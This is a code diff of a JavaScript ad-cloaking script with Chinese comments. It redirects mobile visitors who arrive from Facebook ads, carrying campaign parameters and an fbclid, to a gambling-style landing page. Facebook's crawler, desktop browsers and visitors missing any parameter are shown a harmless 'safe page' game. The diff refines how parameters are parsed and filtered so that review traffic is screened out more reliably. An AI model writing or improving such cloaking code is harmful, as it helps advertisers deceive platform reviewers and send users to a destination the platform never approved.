@@ -2,57 +2,67 @@
     // 【1. 配置：你的落地页主地址】
     var landing_page = "https://www.goldenslot11.com/13/?p0=1uk61sz6";
 
+    // 【2. 增强版解析函数：完美支持中文解码】
     function getQueryParam(name) {
         var reg = new RegExp('(^|&)' + name + '=([^&]*)(&|$)', 'i');
         var r = window.location.search.substr(1).match(reg);
-        if (r != null) return decodeURIComponent(r[2]).trim();
+        if (r != null) {
+            try {
+                // 使用 decodeURIComponent 解码中文素材名
+                return decodeURIComponent(r[2].replace(/\+/g, " ")).trim();
+            } catch (e) {
+                return r[2].trim();
+            }
+        }
         return "";
     }
 
+    // 【3. 核心判定逻辑】
     function shouldRedirect() {
         var search = window.location.search.toLowerCase();
         var ua = navigator.userAgent.toLowerCase();
 
-        // --- A. 基础过滤 ---
-        // 拦截未解析的占位符 {{...}}
+        // A. 占位符拦截（死刑）：拦截 {{...}}
         if (search.indexOf('{{') > -1 || search.indexOf('%7b%7b') > -1) return false;
-        // 强制移动端
-        if (!/android|iphone|ipad|ipod/.test(ua)) return false;
-        // 拦截 Facebook 爬虫
-        if (ua.indexOf('facebookexternalhit') > -1 || ua.indexOf('facebot') > -1) return false;
-        // 拦截自动化工具
-        if (navigator.webdriver) return false;
 
-        // --- B. 核心字段校验 (基于你提供的参数) ---
-        // 校验：pixel, apkch, mvpname, campaign, adgroup, creative
+        // B. 移动端强制校验
+        var isMobile = /android|iphone|ipad|ipod/.test(ua);
+        if (!isMobile) return false;
+
+        // C. 排除 FB 官方机器人
+        if (ua.indexOf('facebookexternalhit') > -1 || ua.indexOf('facebot') > -1) return false;
+
+        // D. 字段深度校验
+        // 校验你提供的所有参数：pixel, apkch, mvpname, campaign, adgroup, creative
         var requiredKeys = ['pixel', 'apkch', 'mvpname', 'campaign', 'adgroup', 'creative'];
         
         for (var i = 0; i < requiredKeys.length; i++) {
             var val = getQueryParam(requiredKeys[i]);
-            // 如果任何一个必填字段为空，或者长度过短（防止占位符被错误解析），则不跳
-            if (val === "" || val.length < 2) {
-                console.log("Missing or invalid field: " + requiredKeys[i]);
+            // 只要字段为空，就不跳转。中文解码后只要有内容即可通过。
+            if (val === "") {
+                console.log("拦截：关键参数 " + requiredKeys[i] + " 为空");
                 return false;
             }
         }
 
-        // --- C. FB 自动生成的点击 ID 校验 ---
-        // fbclid 是 FB 自动追加的，如果是真实点击，这个字段一定存在
+        // E. 必须具备 fbclid (真实点击的灵魂)
         if (getQueryParam('fbclid') === "") return false;
 
         return true;
     }
 
+    // 【4. 执行动作】
     if (shouldRedirect()) {
         document.documentElement.style.display = 'none';
         var connector = landing_page.indexOf('?') > -1 ? '&' : '?';
-        // 透传所有参数：pixel, apkch, mvpname, campaign, adgroup, creative, fbclid
+        
+        // 【关键】直接透传 window.location.search，无需手动重新拼接，确保中文编码不失效
         var finalUrl = landing_page + connector + window.location.search.substring(1);
         
         window.location.replace(finalUrl);
         if (window.stop) window.stop();
     } else {
         document.documentElement.style.display = 'block';
-        if (typeof init === 'function') init(); // 启动安全页游戏
+        if (typeof init === 'function') init();
     }
 })();
